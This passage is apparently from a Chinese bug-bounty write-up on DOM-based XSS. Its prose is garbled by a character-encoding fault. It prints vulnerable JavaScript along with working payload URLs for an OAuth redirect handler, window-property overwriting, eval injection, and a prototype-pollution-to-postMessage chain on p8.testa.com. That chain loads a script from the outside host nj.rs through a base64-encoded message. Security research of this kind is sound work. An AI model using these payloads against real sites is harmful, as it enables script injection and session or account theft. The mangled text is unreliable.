              , i = a.param(n.search); 
            if (i && i.state && (i.code || i.oauth_token)) 
                r = JSON.parse(i.state), 
                i.redirect_uri = r.redirect_uri || n.href.replace(/[\?\#].*$/, ""), 
                r = a.qs(r.oauth_proxy, i), 
                n.assign(r); 
            else if ((i = a.merge(a.param(n.search || ""), a.param(n.hash || ""))) && "s
tate"in i) { 
                try { 
                    var o = JSON.parse(i.state); 
                    a.extend(i, o)
                } catch (e) { 
                    var r = decodeURIComponent(i.state); 
                    try { 
                        var s = JSON.parse(r); 
                        a.extend(i, s) 
                    } catch (e) { 
                        console.error("Could not decode state parameter") 
                    } 
                } 
                "access_token"in i && i.access_token && i.network ? (i.expires_in && 0 !
== parseInt(i.expires_in, 10) || (i.expires_in = 0), 
                i.expires_in = parseInt(i.expires_in, 10), 
                i.expires = (new Date).getTime() / 1e3 + (i.expires_in || 31536e3), 
                l(i, 0, t)) : "error"in i && i.error && i.network ? (i.error = { 
                    code: i.error,
                    message: i.error_message || i.error_description 
                }, 
                l(i, 0, t)) : i.callback && i.callback in t && (o = !!("result"in i && 
i.result) && JSON.parse(i.result),
                d(t, i.callback)(o), 
                u()), 
                i.page_uri && n.assign(i.page_uri) 
            } else 
                "oauth_redirect"in i && n.assign(decodeURIComponent(i.oauth_redirect)); 
è¿™æœ‰å¤šä¸ªå¯ä»¥ Xssçš„â½…æ³• 
responseHandler ä¸­ åªè¦æ»¡â¾œç¬¬â¼€ä¸ªifçš„æ¡ä»¶ï¼Œé€šè¿‡ location.assign()  â½…æ³•åŠ è½½â¼€ä¸ªæ–°çš„é¡µâ¾¯ r
Payload https://test.com/xss?state=
{"oauth_proxy":"javascript:alert(1);//"}&code=xss&oauth_token=xss
ç¬¬â¼†ä¸ªif å¤ªé•¿æ²¡çœ‹ 
å¦‚æœå‰ä¸¤ä¸ªiféƒ½ä¸æ»¡â¾œï¼Œelseä¹Ÿå¯ä»¥å¯¼è‡´Xss,è¿™æ˜¯æœ€ç®€å•çš„ 
Payload https://test.com/xss?oauth_redirect=javascript:alert(1)
ä½†æ˜¯è¿™ä¸ªç«™çš„wafè¶…çº§ä¸¥æ ¼ï¼Œæ ¹æœ¬ç»•ä¸è¿‡ 
ä½†æ˜¯åœ¨ç¬¬â¼†ä¸ªifä¸­ else if ((i = a.merge(a.param(n.search || ""), a.param(n.hash || ""))) &&
"state"in i)  
å¯ä»¥çœ‹åˆ°æŠŠ location.hash ä¹Ÿä¼ ç»™äº† i ï¼Œä¾ç„¶ä½¿â½¤æœ€åçš„elseå†…å®¹æ¥è§¦å‘Xssï¼Œç”±äºhashæ ¹æœ¬ä¸ä¼šå‘é€ç»™æœåŠ¡ç«¯ï¼Œæ‰€ä»¥
wafæ²¡â½¤ã€‚
Payload https://test.com/xss#oauth_redirect=javascript:alert(1)
----- 2
ç¦»è°±ï¼Œå±…ç„¶è·å–ç¬¬â¼€ä¸ªå‚æ•°å€¼ä½œä¸ºscriptæ ‡ç­¾çš„srcå€¼ã€‚ 
ç”±äºå‚¨å­˜åœ¨localStorage è¿™ç®—æ˜¯ä¸ªæŒä¹…xss åªè¦â½¤æˆ·ä¸â¾ƒâ¼°æ¸…é™¤cookieæˆ–è€…è®¿é—®æœ‰å‚æ•°çš„é¡µâ¾¯ 
Payload https://test.com/xss?xss=data:,alert(1)// æˆ– 
Payload https://test.com/xss?xss=//nj.rs
----- 3
var query = getQueryParams(); 
$.each(query, function(key, value) { 
    window[key] = value; 
}); 
function getQueryParams() { 
    var qs = document.location.search + '&' + document.location.hash.replace('#', ''); 
    qs = qs.split("+").join(" "); 
    var params = {}, 
        tokens, 
        re = /[?&]?([^=]+)=([^&]*)/g; 
    while (tokens = re.exec(qs)) {
        params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]); 
    } 
    return params; 
} 
è¿™ä¸ªä¼¼ä¹æ˜¯æƒ³æŠŠæ‰€æœ‰å‚æ•°å’Œhashä¸­çš„å‚æ•°å‚¨å­˜åœ¨ window å¯¹è±¡ä¸­,å¯æ˜¯è¿™æ ·å¯ä»¥ä¿®æ”¹â¼€äº›åŸæœ‰çš„â¼¦å¯¹è±¡ï¼Œâ½å¦‚ location
Payload https://test.com/xss#location=javascript:alert(1)  
â¼€èˆ¬èƒ½â½¤hashå°±â½¤hashï¼Œå› ä¸ºè¿™æ ·ä¸ä¼šè¢«wafæ£€æµ‹
----- 4 
é€šå¸¸evalå¾ˆå®¹æ˜“é€ æˆXssï¼Œè°¨æ…ä½¿â½¤
String.prototype.queryStringToJSON = String.prototype.queryStringToJSON || function() { 
    var params = String(this)  // ä¸Šæ–‡ä¸­this = location.href 
      , params = params.substring(params.indexOf("?") + 1); 
    if (params = params.replace(/\+/g, "%20"), 
    "{" === params.substring(0, 1) && "}" === params.substring(params.length - 1)) 
        return eval(decodeURIComponent(params)); 
    params = params.split(/\&(amp\;)?/); 
    for (var json = {}, i = 0, n = params.length; i < n; ++i) { 
        var param = params[i] || null, key, value, key, value, keys, path, cmd, param; 
        null !== param && (param = param.split("="), 
        null !== param && (key = param[0] || null, 
        null !== key && void 0 !== param[1] && (value = param[1], 
        key = decodeURIComponent(key), 
        value = decodeURIComponent(value), 
        keys = key.split("."), 
        1 === keys.length ? json[key] = value : (path = "", 
        cmd = "", 
        $.each(keys, function(ii, key) { 
            path += '["' + key.replace(/"/g, '\\"') + '"]', 
            jsonCLOSUREGLOBAL = json, 
            cmd = "if ( typeof jsonCLOSUREGLOBAL" + path + ' === "undefined" ) jsonCLOSU
REGLOBAL' + path + " = {}", 
            eval(cmd), 
            json = jsonCLOSUREGLOBAL, 
            delete jsonCLOSUREGLOBAL 
        }), 
        jsonCLOSUREGLOBAL = json, 
        valueCLOSUREGLOBAL = value, 
        cmd = "jsonCLOSUREGLOBAL" + path + " = valueCLOSUREGLOBAL", 
        eval(cmd), 
        json = jsonCLOSUREGLOBAL, 
        delete jsonCLOSUREGLOBAL, 
        delete valueCLOSUREGLOBAL)))) 
    } 
    return json 
} 
ç¬¬â¼€å¤„evalï¼Œåªæ˜¯é€šè¿‡ifåˆ¤æ–­æ˜¯å¦{}åŒ…è£¹
Payload 1 https://test.com/xss/?{alert(1)}
ç¬¬â¼†å¤„evalï¼Œåªè¦åœ¨ä¼ â¼Ševalçš„å†…å®¹ä¸­ï¼Œæƒ³åŠæ³•è®©â¾ƒâ¼°çš„jså¯ä»¥æ‰§â¾å°±â¾ 
åœ¨æœ¬åœ°æµ‹è¯•,ï¼Œä¼ â¼Šå¦‚ä¸‹jså°±å¯ä»¥æ‰§â¾ 
if ( typeof jsonCLOSUREGLOBAL["x"]["\\"]);alert(1);//"] === "undeï¬ned" )
jsonCLOSUREGLOBAL["x"]["\\"]);alert(1);//"] = {}  
æ‰€ä»¥ 
Payload 2 https://test.com/xss/?x.\%22]);alert(1);/%2f=1
ç¬¬3å¤„evalï¼Œç•¥ã€‚
----- 5 
PostMessage Xss,è¿™ä¼¼ä¹æœ‰å¾ˆå¤šå…³äºè¿™ç§ç±»å‹çš„â½‚ç« ã€‚ 
Client-Side Prototype Pollutionå‚è€ƒ https://github.com/BlackFan/client-side-prototype-pollution ã€‚è¿™
ä¿©ä¸ªåœ¨BugBountyä¸­ä¹Ÿâ¾®å¸¸åƒâ¾¹ã€‚ 
åˆ†äº«â¼€ä¸ªä¿©è€…ç»“åˆçš„Xss
èµ·å› æ˜¯ 
æˆ‘æ‰«åˆ°â¼€ä¸ª p8.testa.com çš„Client-Side Prototype Pollutionï¼Œæäº†å¾ˆä¹…ä¹‹åï¼Œç»ˆäºå¯ä»¥Xss 
https://p8.testa.com/gb/view?ssc=us1&member=chinna.padma&constructor[prototype]
[jsAttributes][onafterscriptexecute]=alert(document.domain)  
ä½†æ˜¯â¼šå•†å´è¯´è¿™ä¸ªåŸŸåè¶…å‡ºèŒƒå›´ï¼Œæˆ‘å¹¶ä¸æƒ³è®©åŠªâ¼’â½©è´¹ 
ç„¶åæˆ‘å¯»æ‰¾åˆ°æ˜ç¡®èŒƒå›´å†…çš„â¼€å¤„PostMessage
var POLL_INTERVAL = 2e3, 
    MAX_POLLS = 3, 
    ALLOWED_ORIGINS_REGEX = /^https?\:\/\/([^\/\?]+\.)*((testa|testb|testc)\.(net|com|co
m\.au))(\:\d+)?([\/\?]|$)/; 
function onElementHeightChange(t, n, i, o) { 
    if (t && n) { 
        var r = t.clientHeight, 
            a = 0, 
            m = 0; 
        o = o || MAX_POLLS, 
            "number" == typeof r && (r -= 1), 
            function e() { 
                a = t.clientHeight, 
                    m++, 
                    r !== a && (n(), r = a), 
                    t.onElementHeightChangeTimer && clearTimeout(t.onElementHeightChange
Timer), 
                    i ? t.onElementHeightChangeTimer = setTimeout(e, i) : m <= o && (t.o
nElementHeightChangeTimer = setTimeout(e, POLL_INTERVAL)) 
            }() 
    } 
} 
window.addEventListener("message",
    function(e) { 
        if (ALLOWED_ORIGINS_REGEX.test(e.origin)) { 
            if ("string" != typeof e.data) return; 
            var t = e.source, 
                n = e.origin, 
                i = {}; 
            try { 
                i = JSON.parse(e.data) 
            } catch (e) { 
                return 
            } 
            var o, r = i.id || 0, 
                a = i.markup, 
                m = i.scriptSrc, 
                c = "", 
                d = function() { 
                    c = r + ":" + document.body.clientHeight, 
                        t.postMessage(c, n) 
                }; 
            if (a && (document.body.innerHTML = a, !m)) return void d(); 
            m && ((o = document.createElement("script")).src = m, o.onload = function() 
{ 
                    onElementHeightChange(document.body, d, i.pollInterval, i.maxPolls) 
                }, 
                document.body.appendChild(o)) 
        } 
    }) 
å¾ˆæ˜æ˜¾æ­¤å¤„ï¼Œè·å–messageä¸­jsonå­—æ®µ scriptSrc ä½œä¸ºscriptçš„srcå€¼,å°½ç®¡å·²ç»éªŒè¯äº† origin ,ä½†æ˜¯ç”±äºæœ‰éªŒè¯åŸŸçš„Xss,æ‰€
ä»¥å¯ä»¥é€šè¿‡éªŒè¯è·å¾—Xss
Payload
https://p8.testa.com/gb/view?ssc=us1&member=chinna.padma&constructor[prototype][jsAttrib
utes][onafterscriptexecute]=document.body.innerHTML=%27%3Ciframe%20src=%22https://s.xx.c
om/yc/html/embed-iframe-min.2d7457d4.html%22%20onload=%22this.contentWindow.postMessage
(window.atob(\%27eyJpZCI6IjEiLCJtYXJrdXAiOiJ4Iiwic2NyaXB0U3JjIjoiaHR0cHM6Ly9uai5ycyIsInB
vbGxJbnRlcnZhbCI6IngiLCJtYXhQb2xscyI6IngifQ==\%27),\%27*\%27)%22%3E%3C/iframe%3E%27 
ç»“è¯­
Dom Xssçš„å½¢å¼è¿˜æœ‰å¾ˆå¤šï¼Œæˆ‘æŠŠåœ¨BugBountyä¸­é‡åˆ°â½è¾ƒå¤šè§çš„å½¢å¼åˆ†äº«å‡ºæ¥ï¼Œä»…ä¾›å‚è€ƒã€‚ 
ç”±äºå¾ˆå¤šéƒ½æ˜¯åœ¨è¿‡å»æŠ¥å‘Šä¸­æ‘˜å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¯èƒ½æœ‰é”™è¯¯ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œä½†ä¸»è¦æ˜¯ç†è§£æ„æ€å°±å¥½ã€‚ 
ä¹Ÿæ¬¢è¿äº¤æµï¼Œè·Ÿç€â¼¤ä½¬å¸ˆå‚…ä»¬å­¦ä¹  ğŸ˜„